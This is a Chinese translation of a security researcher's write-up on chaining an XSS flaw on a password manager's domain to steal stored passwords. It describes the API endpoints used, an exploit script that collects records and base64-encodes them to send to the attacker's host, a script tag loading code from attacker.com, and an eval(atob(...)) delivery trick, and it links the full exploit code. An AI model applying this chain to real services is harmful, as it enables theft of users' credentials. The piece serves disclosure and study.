**PS：本文仅作技术讨论，禁止用于任何非法用途**

## 前言

**大家好！自我上次写作以来到现在已经有段时间了。今天，我想和大伙分享一些非常有意思的内容。为了存储及管理的方便，相信大家可能都会选择使用一些密码管理器来存储不同网站的密码（例如Facebook，Gmail等其他帐户）。那么，作为存储如此敏感数据的管理工具是否应该保证足够的安全性呢？**

 **![Screenshot 2018-08-22 at 12.30.17
PM.png](https://image.3001.net/images/20180827/1535335000_5b835a58cb513.png!small)**

## 场景

在我遇到的这个场景中，其中不仅包含了账户密码它还包含了该公司员工的密码。令我感到惊讶的是，我在同一域中发现了一个XSS漏洞，并最终利用该漏洞成功窃取了其中的用户密码信息。

每当我测试一个应用程序时，我都会首先确定我的目标公司类型。而当前测试的目标则是一个密码管理器，显而易见这是一个存储密码的地方。而密码也这正是他们所要保护的敏感数据，我的目标就是捕获和检索这些密码。

![目标公司类型](https://image.3001.net/images/20180827/1535335025_5b835a717a657.png!small)

## 应用工作流程

为了更好的理解应用程序，我们需要了解它的功能和流程，以及它是如何检索数据以及检索数据的位置。

在仔细观察应用程序并完成各个请求之后，我发现应用程序会从位于应用程序的/api/的API中检索不同的信息。

在对应用程序进行一些爬行和抓取后，我发现了一些API端点：

![API端点](https://image.3001.net/images/20180827/1535335044_5b835a84b9f5c.png!small)

## API端点观察

当应用程序与API完全交互时，每个端点都返回了一些值和信息，其中包括record ID，session token和其他一些内容。让我来解释下这些API。

### records/all 端点

位于 **/api/v3/records/all** 的端点，它正在接受GET请求。一旦在进行身份验证时发送了GET请求，它就会返回具有 **record
ids** 的JSON对象，以及与可用记录相关的其他信息。

![可用记录相关的其他信息](https://image.3001.net/images/20180827/1535335105_5b835ac147bd2.png!small)

### passwords/record 端点

该端点位于 **/api/v1/passwords/record** 。在 **record IDs从record/all**
端点被检索后，该端点用于从这些特定记录ID中检索密码及其完整信息。

在我们的例子中，我们获取到了以下record IDs：

  * **526882 -** " **Facebook Account** " record ID
  * **526883 -** " **Google Email** " record ID

如果用户单击“ " **Facebook Account** " 记录，一个使用以下JSON数据以及record ID为 **526882**
的POST请求，将会被发送到 **/api/v1/passwords/record** 端点。

![发送到/api/v1/passwords/record端点](https://image.3001.net/images/20180827/1535335130_5b835ada850a1.png!small)

这将返回指定ID的以下信息：

![返回指定ID的以下信息](https://image.3001.net/images/20180827/1535335147_5b835aeb68b25.png!small)

现在我们已经知道了ID是如何被检索的，以及它们是如何返回数据的。但有个问题就是，应用程序在发送给API的每个POST请求中都发送了一个CSRF
token。在请求中包含一个 " **token** "，是为了对用户会话进行验证。

### session/token 端点

为了弄清楚token是如何生成的，我查看了其它的一些端点，最终发现位于 **/api/v1/session/token** 的API端点是负责生成CSRF
tokens的。

发送一个GET请求至该端点，你将会获取到以下响应：

![响应](https://image.3001.net/images/20180827/1535335189_5b835b1587dc9.png!small)

## XSS漏洞

现在，我们开始了解应用程序的流程和用于数据交换的端点。我们需要以某种方式从以下端点获取信息：

> Session Token 来自 **/api/v1/passwords/record**
>
> Record IDs 来自 **/api/v3/records/all**
>
> Record 信息 来自 **/api/v1/passwords/record**

从端点获取信息，有一个简单的技巧就是利用一些配置错误的CORS，但可惜的是该应用似乎并没有将它用于资源共享。

另一种可能性是在同一个域的某个地方找到XSS漏洞，绕过同源策略（SOP）。否则，将会因为触发SOP，导致我们所有的 **XHR** 调用都被拒绝。

经过一番测试，我成功的在一个电子邮件激活页面上找到了一个XSS漏洞。如下所示：

![XSS漏洞](https://image.3001.net/images/20180827/1535335228_5b835b3c608ea.png!small)

现在，我们就不必再担心SOP了，并可使用与应用程序相同的方式与API进行通信。

## 利用脚本

首先，我们将使用javascript的 **fetch()** 函数来向 **/api/v3/records/all**
发出GET请求，以获取所有的record ID：

![获取所有的record
ID](https://image.3001.net/images/20180827/1535335273_5b835b6980d52.png!small)

抓取记录后，接下来就是获取session
token以进行POST请求。这里我还将记录的响应转换为了JSON，并直接从JSON对象调用记录ID的值。fetch()函数用于发送GET请求，以捕获令牌并从JSON对象中检索其值：

![检索其值](https://image.3001.net/images/20180827/1535335337_5b835ba971700.png!small)

现在，我们获取到了 **“session_token”** 和 **“record IDs”** 。接下来我们要做的就是将具有"record
ID"的POST请求，发送到 **/api/v1/passwords/record**
端点。我将使用XHR发送具有指定记录ID的POST请求。我将遍历record IDs逐个检索每条记录的信息：

![检索每条记录的信息](https://image.3001.net/images/20180827/1535335358_5b835bbee099a.png!small)

如你所看到的第30-34行，我们进行了一些适当配置。在第45行，我们将这些值以
**{"id":record_ID_here,"is_organization:false}** 的形式放置，然后发出请求。

请求完成后，将解析响应并从响应中获取值，例如 **标题，URL，用户名，密码** 。然后将这些值添加到虚拟变量 **“data_chunks”**
进行最终的处理。

![进行最终的处理](https://image.3001.net/images/20180827/1535335379_5b835bd3212e0.png!small)

在使用收集的数据填充虚拟变量之后，它将转换为base64以避免错误字符冲突，并将其发送至攻击者的主机上。

![发送至攻击者的主机上](https://image.3001.net/images/20180827/1535335472_5b835c3030222.png!small)

>
> 注意：还有许多其他方法可以用来正确发送抓取的数据，但出于演示目的我使用的方法很简单，例如直接发送base64编码数据。其实，通过POST将数据发送至特定文件也是一个不错的选择。

## 漏洞利用

现在，我们的漏洞利用脚本已经编写完成。那么我们该如何进行利用呢？这里有两个简单的XSS利用技巧。

> 在外部主机上托管你的javascript利用脚本（你可能必须要设置CORS才能成功访问）；
>
> 直接用eval和atob包含payload。

对于第一种技术，需要通过 **< script
src="<http://attacker.com/path_to_exploit.js>"></script>**来加载外部JS。这种方法在处理大型漏洞利用代码时非常有效，并且还有一个好处就是利用代码不会被记录在服务器中。

第二种方法可用于处理一些较简短的payload。我使用的payload如下：

![使用的payload](https://image.3001.net/images/20180827/1535335499_5b835c4b0fa3d.png!small)

现在用我们的base64编码的源代码替换atob()的值。首先，我们的payload将由atob解码，然后由eval()执行。

最终的payload如下：

![最终的payload](https://image.3001.net/images/20180827/1535335523_5b835c63e3bee.png!small)

这里或许有人会说这并不是一个简短的payload，而是一个较大的payload。其实它也可以从外部主机被加载，但这里我为了避免CORS设置所带来的麻烦，所以才使用了这种方法。

现在我将托管一个内容如下的exploit.html文件：

![exploit.html](https://image.3001.net/images/20180827/1535335554_5b835c826c933.png!small)

现在只需为exploit.html提供一个URL，攻击者就可以将用户重定向到一个注入了payload的页面上。

成功利用后，我们将获取到以下数据：

![获取到以下数据](https://image.3001.net/images/20180827/1535335596_5b835cacba8e9.png!small)

可以看到，存储在Password Vault中的记录成功被我们检索了出来，并且我们也放大了该XSS漏洞带来的安全影响。

漏洞利用代码我已经发布在了<https://gist.github.com/shawarkhanethicalhacker/e40a7c3956fdd24b9fb63d03d94c3d34>，有兴趣的可以自行下载测试。

 ***参考来源：[shawarkhan](https://www.shawarkhan.com/2018/08/the-dark-side-of-xss-and-hacking-into.html)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

